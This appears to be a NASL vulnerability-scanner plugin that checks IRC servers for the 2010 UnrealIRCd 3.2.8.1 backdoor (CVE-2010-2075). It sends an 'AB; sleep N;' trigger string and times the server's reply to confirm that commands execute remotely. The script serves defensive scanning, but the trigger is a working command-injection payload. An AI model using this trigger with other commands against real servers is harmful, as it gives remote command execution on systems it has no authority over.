CPE = "cpe:/a:unrealircd:unrealircd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80111" );
	script_version( "$Revision: 13960 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2010-06-13 17:55:39 +0200 (Sun, 13 Jun 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2010-2075" );
	script_bugtraq_id( 40820 );
	script_name( "Check for Backdoor in UnrealIRCd" );
	script_category( ACT_ATTACK );
	script_copyright( "This script is Copyright (C) 2010 Vlatko Kosturjak" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "gb_unrealircd_detect.sc" );
	script_require_ports( "Services/irc", 6667 );
	script_mandatory_keys( "UnrealIRCD/Detected" );
	script_xref( name: "URL", value: "http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2010/Jun/277" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/40820" );
	script_tag( name: "summary", value: "Detection of backdoor in UnrealIRCd." );
	script_tag( name: "insight", value: "Remote attackers can exploit this issue
  to execute arbitrary system commands within the context of the affected
  application.

  The issue affects Unreal 3.2.8.1 for Linux. Reportedly package
  Unreal3.2.8.1.tar.gz downloaded in November 2009 and later is
  affected. The MD5 sum of the affected file is
  752e46f2d873c1679fa99de3f52a274d. Files with MD5 sum of
  7b741e94e867c0a7370553fd01506c66 are not affected." );
	script_tag( name: "solution", value: "Install latest version of unrealircd
  and check signatures of software you're installing." );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
sock = open_sock_tcp( port );
if(!sock){
	exit( 0 );
}
line = recv( socket: sock, length: 16384 );
for i in make_list( 3,
	 5,
	 10 ) {
	reqstr = NASLString( "AB; sleep ", i, ";\\n" );
	send( socket: sock, data: reqstr );
	start = unixtime();
	line = recv_line( socket: sock, length: 4096 );
	stop = unixtime();
	if(stop - start < i || stop - start > ( i + 5 )){
		exit( 0 );
	}
}
close( sock );
security_message( port: port );
exit( 0 );

